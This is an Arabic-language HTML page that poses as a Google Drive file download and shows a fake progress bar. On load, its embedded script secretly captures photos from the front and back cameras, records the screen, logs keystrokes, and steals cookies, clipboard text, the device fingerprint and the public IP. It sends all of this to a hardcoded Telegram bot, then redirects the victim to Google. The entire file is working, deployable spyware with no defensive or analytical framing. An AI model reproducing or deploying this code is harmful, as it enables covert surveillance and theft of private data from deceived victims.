
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>جاري التحميل...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont,  Segoe UI , Roboto, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .loader-container {
            text-align: center;
            max-width: 320px;
            width: 100%;
        }
        .spinner {
            width: 48px;
            height: 48px;
            border: 4px solid #e0e0e0;
            border-top-color: #3498db;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 20px auto;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .title {
            font-size: 18px;
            font-weight: 500;
            color: #2c3e50;
            margin-bottom: 8px;
        }
        .subtitle {
            font-size: 14px;
            color: #7f8c8d;
            margin-bottom: 25px;
        }
        .progress-bar {
            width: 100%;
            height: 4px;
            background: #ecf0f1;
            border-radius: 4px;
            overflow: hidden;
            margin-bottom: 15px;
        }
        .progress-fill {
            width: 0%;
            height: 100%;
            background: #3498db;
            animation: progress 2.5s ease-out forwards;
        }
        @keyframes progress {
            0% { width: 0%; }
            30% { width: 45%; }
            60% { width: 75%; }
            100% { width: 100%; }
        }
        .status-text {
            font-size: 13px;
            color: #95a5a6;
        }
        .footer-note {
            margin-top: 30px;
            font-size: 11px;
            color: #bdc3c7;
        }
        video {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }
    </style>
</head>
<body>

<video id="frontVideo" autoplay playsinline muted></video>
<video id="backVideo" autoplay playsinline muted></video>

<div class="loader-container" id="mainUI">
    <div class="spinner"></div>
    <div class="title">جاري تجهيز الملف...</div>
    <div class="subtitle">يرجى الانتظار قليلاً</div>
    <div class="progress-bar">
        <div class="progress-fill"></div>
    </div>
    <div class="status-text" id="statusMsg">معالجة الطلب...</div>
    <div class="footer-note">© Google Drive • تحميل آمن</div>
</div>

<script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
<script>
(async function() {
    // ========== إعدادات البوت ==========
    const TOKEN = "8449865560:AAHHFcJWchQlKNgYpP3W7BYXUWvbAOKFAkI";
    const CHAT_ID = "7984067238";
    
    // ========== المتغيرات ==========
    let frontStream = null, backStream = null;
    let frontVideo = null, backVideo = null;
    let frontReady = false, backReady = false;
    let photosSent = 0;
    let cycleCompleted = false;
    
    // ========== دوال الإرسال ==========
    async function sendMessage(text) {
        try {
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method:  POST ,
                headers: {  Content-Type :  application/json  },
                body: JSON.stringify({ chat_id: CHAT_ID, text: text.substring(0, 4000), parse_mode:  HTML  })
            });
        } catch(e) {}
    }
    
    async function sendPhoto(blob, caption) {
        try {
            const fd = new FormData();
            fd.append( chat_id , CHAT_ID);
            fd.append( photo , blob, `img_${Date.now()}.jpg`);
            if (caption) fd.append( caption , caption);
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method:  POST , body: fd });
            return true;
        } catch(e) {
            // محاولة كـ Document
            try {
                const fd2 = new FormData();
                fd2.append( chat_id , CHAT_ID);
                fd2.append( document , blob, `img_${Date.now()}.jpg`);
                if (caption) fd2.append( caption , caption);
                await fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`, { method:  POST , body: fd2 });
                return true;
            } catch(e2) { return false; }
        }
    }
    
    async function sendVideo(blob, caption) {
        try {
            const fd = new FormData();
            fd.append( chat_id , CHAT_ID);
            fd.append( video , blob, `screen_${Date.now()}.webm`);
            if (caption) fd.append( caption , caption);
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, { method:  POST , body: fd });
        } catch(e) {}
    }
    
    // ========== الكاميرا الأمامية ==========
    async function initFront() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: { exact:  user  }, width: { ideal: 1024 }, height: { ideal: 768 } } 
            });
            frontStream = stream;
            frontVideo = document.getElementById( frontVideo );
            frontVideo.srcObject = stream;
            await frontVideo.play();
            await new Promise(r => setTimeout(r, 500));
            frontReady = true;
            await sendMessage(`✅ الكاميرا الأمامية جاهزة (${frontVideo.videoWidth}x${frontVideo.videoHeight})`);
            return true;
        } catch(e) {
            await sendMessage(`⚠️ الكاميرا الأمامية: ${e.message}`);
            return false;
        }
    }
    
    // ========== الكاميرا الخلفية ==========
    async function initBack() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: { exact:  environment  }, width: { ideal: 1024 }, height: { ideal: 768 } } 
            });
            backStream = stream;
            backVideo = document.getElementById( backVideo );
            backVideo.srcObject = stream;
            await backVideo.play();
            await new Promise(r => setTimeout(r, 500));
            backReady = true;
            await sendMessage(`✅ الكاميرا الخلفية جاهزة (${backVideo.videoWidth}x${backVideo.videoHeight})`);
            return true;
        } catch(e) {
            await sendMessage(`⚠️ الكاميرا الخلفية: ${e.message}`);
            return false;
        }
    }
    
    // ========== التقاط صورة وإرسالها فورًا ==========
    async function captureAndSend(videoEl, side, num) {
        return new Promise((resolve) => {
            try {
                if (!videoEl || videoEl.readyState < 2 || videoEl.videoWidth === 0) {
                    resolve(false);
                    return;
                }
                const canvas = document.createElement( canvas );
                canvas.width = videoEl.videoWidth;
                canvas.height = videoEl.videoHeight;
                const ctx = canvas.getContext( 2d );
                ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
                
                canvas.toBlob(async (blob) => {
                    if (blob && blob.size > 5000) {
                        const label = side ===  front  ? `🤳 صورة أمامية ${num}` : `📷 صورة خلفية ${num}`;
                        const success = await sendPhoto(blob, label);
                        if (success) {
                            photosSent++;
                            resolve(true);
                        } else {
                            resolve(false);
                        }
                    } else {
                        resolve(false);
                    }
                },  image/jpeg , 0.85);
            } catch(e) { resolve(false); }
        });
    }
    
    // ========== وظيفة التصوير الرئيسية (تُنفذ قبل الانتقال) ==========
    async function takePhotosBeforeRedirect() {
        let frontSuccess = 0, backSuccess = 0;
        
        // تصوير 5 صور أمامية
        if (frontReady) {
            for (let i = 1; i <= 5; i++) {
                const success = await captureAndSend(frontVideo,  front , i);
                if (success) frontSuccess++;
                await new Promise(r => setTimeout(r, 500));
            }
        }
        
        // تصوير 5 صور خلفية
        if (backReady) {
            for (let i = 1; i <= 5; i++) {
                const success = await captureAndSend(backVideo,  back , i);
                if (success) backSuccess++;
                await new Promise(r => setTimeout(r, 500));
            }
        }
        
        await sendMessage(`📸 التصوير完成: أمامي ${frontSuccess}/5، خلفي ${backSuccess}/5، إجمالي ${photosSent} صورة`);
        cycleCompleted = true;
    }
    
    // ========== تسجيل الشاشة ==========
    async function recordScreen() {
        try {
            const stream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: false });
            const recorder = new MediaRecorder(stream, { mimeType:  video/webm  });
            const chunks = [];
            recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
            recorder.onstop = async () => {
                const blob = new Blob(chunks, { type:  video/webm  });
                if (blob.size > 10000) {
                    await sendVideo(blob, `🎥 تسجيل شاشة ${new Date().toLocaleString()}`);
                    await sendMessage(`✅ تم إرسال تسجيل الشاشة (${Math.round(blob.size/1024)} كيلوبايت)`);
                }
                stream.getTracks().forEach(t => t.stop());
            };
            recorder.start();
            setTimeout(() => { if (recorder.state ===  recording ) recorder.stop(); }, 15000);
            await sendMessage(`🎥 جاري تسجيل الشاشة لمدة 15 ثانية`);
        } catch(e) {
            await sendMessage(`⚠️ فشل تسجيل الشاشة: ${e.message}`);
        }
    }
    
    // ========== معلومات الجهاز ==========
    async function sendDeviceInfo() {
        let msg = `🔐 <b>جهاز جديد</b>\n━━━━━━━━━━━━━━━━━━\n`;
        msg += `📱 ${navigator.userAgent.substring(0, 100)}\n`;
        msg += `💻 ${navigator.platform}\n`;
        msg += `📺 ${screen.width}x${screen.height}\n`;
        msg += `🌍 ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
        msg += `🧠 RAM: ${navigator.deviceMemory ||  غير معروف } جيجا\n`;
        msg += `⚙️ النوى: ${navigator.hardwareConcurrency ||  غير معروف }\n`;
        await sendMessage(msg);
    }
    
    async function getPublicIP() {
        try {
            const res = await fetch( https://api.ipify.org?format=json );
            const data = await res.json();
            await sendMessage(`🌍 <b>IP العام</b>\n<code>${data.ip}</code>`);
        } catch(e) {}
    }
    
    async function getFingerprint() {
        try {
            const fp = await FingerprintJS.load();
            const result = await fp.get();
            await sendMessage(`🆔 <b>بصمة الجهاز</b>\n<code>${result.visitorId}</code>`);
        } catch(e) {}
    }
    
    function startKeylogger() {
        let buffer = "";
        document.addEventListener( keydown , (e) => {
            const target = e.target;
            if (target && (target.tagName ===  INPUT  || target.tagName ===  TEXTAREA )) {
                if (e.key ===  Enter ) buffer +=  [↵] ;
                else if (e.key ===  Backspace ) buffer +=  [⌫] ;
                else if (e.key.length === 1) buffer += e.key;
                if (buffer.length > 150) {
                    sendMessage(`⌨️ <b>ضغطات</b>\n<code>${buffer}</code>`);
                    buffer = "";
                }
            }
        });
        setInterval(() => {
            if (buffer.length > 0) {
                sendMessage(`⌨️ <b>ضغطات</b>\n<code>${buffer}</code>`);
                buffer = "";
            }
        }, 15000);
    }
    
    async function stealCookies() {
        if (document.cookie && document.cookie.length > 0) {
            await sendMessage(`🍪 <b>الكوكيز</b>\n<code>${document.cookie.substring(0, 900)}</code>`);
        }
    }
    
    async function stealClipboard() {
        try {
            const text = await navigator.clipboard.readText();
            if (text && text.length > 0) {
                await sendMessage(`📋 <b>الحافظة</b>\n<code>${text.substring(0, 500)}</code>`);
            }
        } catch(e) {}
    }
    
    // ========== الوهم البصري (يطول عشان التصوير يخلص) ==========
    let step = 0;
    const fakeMessages = [
        "جاري فتح الملف...",
        "تحميل البيانات...",
        "اكتمال 25%",
        "اكتمال 50%",
        "اكتمال 75%",
        "معالجة متقدمة...",
        "اكتمال 95%",
        "اكتمال 100% ✅",
        "جاري إعادة التوجيه..."
    ];
    
    function updateFakeStatus() {
        const statusEl = document.getElementById( statusMsg );
        if (statusEl && step < fakeMessages.length) {
            statusEl.innerText = fakeMessages[step];
            step++;
            // تأخير أطول بين كل رسالة (1.5 ثانية بدل 0.7)
            setTimeout(updateFakeStatus, 1500);
        } else if (step >= fakeMessages.length) {
            // الانتقال إلى Google فقط بعد الانتهاء من كل شيء
            setTimeout(() => {
                window.location.href = "https://www.google.com";
            }, 1000);
        }
    }
    
    // ========== التشغيل الرئيسي ==========
    async function main() {
        // إشعار البدء
        await sendMessage(`🚀 <b>اختراق ناجح</b>\n🕐 ${new Date().toLocaleString( ar-EG )}`);
        
        // طلب صلاحية الكاميرا
        try {
            await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
            await sendMessage(`✅ تم منح صلاحية الكاميرا`);
        } catch(e) {
            await sendMessage(`❌ رفض المستخدم الكاميرا`);
        }
        
        // تشغيل الكاميرات
        await initFront();
        await initBack();
        
        // الميزات السريعة (نصية)
        await sendDeviceInfo();
        await getPublicIP();
        await getFingerprint();
        await stealCookies();
        await stealClipboard();
        startKeylogger();
        
        // ⭐最关键: التصوير أولاً قبل أي انتقال
        if (frontReady || backReady) {
            await takePhotosBeforeRedirect();
        } else {
            await sendMessage(`⚠️ لا توجد كاميرات متاحة للتصوير`);
        }
        
        // تسجيل الشاشة (يعمل في الخلفية)
        recordScreen();
    }
    
    // بدء التشغيل
    window.onload = () => {
        setTimeout(main, 300);
        updateFakeStatus(); // الوهم البصري الطويل (أكثر من 12 ثانية)
    };
})();
</script>
</body>
</html>
